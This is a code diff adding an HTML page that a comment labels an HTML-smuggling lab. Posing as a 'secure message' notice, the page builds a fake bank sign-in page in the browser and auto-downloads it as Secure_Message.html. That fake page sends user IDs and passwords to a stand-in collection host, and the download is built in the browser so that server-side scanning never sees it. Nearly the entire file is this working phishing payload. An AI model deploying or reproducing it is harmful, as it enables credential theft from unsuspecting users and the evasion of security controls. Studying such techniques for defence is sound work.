@@ -1,0 +1,15 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Secure message</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{font:16px system-ui;max-width:560px;margin:60px auto;padding:0 16px;color:#1d2939}</style></head>
+<body><!-- Lab: HTML smuggling. The page builds a phishing page as a file in the browser and saves it
+     automatically (no server download to scan); the link offers it again. -->
+<h2>You have a secure message</h2>
+<p>Your encrypted document is being downloaded. Open <b>Secure_Message.html</b> to read it.</p>
+<p><a id="again" download="Secure_Message.html">Download again</a></p>
+<script>
+const page = "<!doctype html><title>Sign in</title><h1>Example Bank</h1><form action='http://collect.example/'>" +
+  "<input name=u placeholder='User ID'><input type=password name=p placeholder=Password><button>Sign in</button></form>";
+const url = URL.createObjectURL(new Blob([page], {type: "text/html"}));
+document.getElementById("again").href = url;
+setTimeout(() => { const a = document.createElement("a"); a.href = url; a.download = "Secure_Message.html"; a.click(); }, 800);
+</script></body></html>
